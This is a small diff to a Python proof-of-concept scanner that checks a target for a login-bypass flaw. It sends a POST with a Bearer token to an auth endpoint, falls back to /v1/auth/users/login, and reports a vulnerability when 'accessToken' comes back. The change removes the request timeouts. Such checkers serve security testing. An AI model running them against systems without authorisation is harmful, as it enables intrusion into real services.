@@ -62,7 +62,7 @@ class poc:
         }
         self.headers["Authorization"] = "Bearer {}".format(token)
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if "accessToken" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在登录绕过漏洞\033[0m
@@ -77,7 +77,7 @@ class poc:
                 return True
             elif result.status_code == 404:
                 url = "{}://{}/v1/auth/users/login".format(scheme, netloc)
-                result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
                 if "accessToken" in result.text:
                     target = urlparse(url)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在登录绕过漏洞\033[0m
